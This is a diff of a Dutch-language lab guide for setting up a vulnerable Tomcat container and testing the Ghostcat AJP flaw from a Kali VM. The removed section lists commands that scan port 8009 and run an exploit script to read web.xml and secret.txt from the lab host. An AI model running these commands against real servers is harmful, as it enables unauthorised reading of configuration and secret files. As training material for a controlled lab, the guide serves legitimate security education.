@@ -74,7 +74,7 @@ toon hier de aanval kort of dingen die belangrijk zijn om te weten
 
 <!-- @ Jamie -->
 
-## 3) Starten van de opdracht (UBUNTU VM)
+## 3) Opzetten van de kwetsbaarheid (UBUNTU VM)
 
 Nu we een correcte virtuele omgeving hebben in beide VM's kunnen we beginnen aan de opdracht zelf. Hierbij gaan we dus nog een paar commando's uitvoeren.
 
@@ -91,18 +91,6 @@ Nu we een correcte virtuele omgeving hebben in beide VM's kunnen we beginnen aan
 - 3.8) chmod +x setup_tomcat.sh
 - 3.9) sudo ./setup_tomcat.sh
 - controleer nu in een browser of je ook deze Tomcat-container draait op poort 8080 -> http://10.10.10.4:8080
-
-## 4) Starten van de opdracht (KALI VM)
-
-- 4.1) Start de kali vm (indien deze nog niet aan staat):
-- 4.2) open terminal
-- 4.3) sudo systemctl start ssh
-- 4.4) sudo systemctl enable ssh
-- 4.5) cd Downloads
-- 4.6) chmod +x exploit_ghostcat.py
-- 4.7) nmap 10.10.10.4 -p 8009
-- 4.8) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/web.xml read
-- 4.9) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/secret.txt read
 
 ## Ondersteuning en foutoplossing: Veelvoorkomende problemen en oplossingen. Contactinformatie voor technische ondersteuning
 
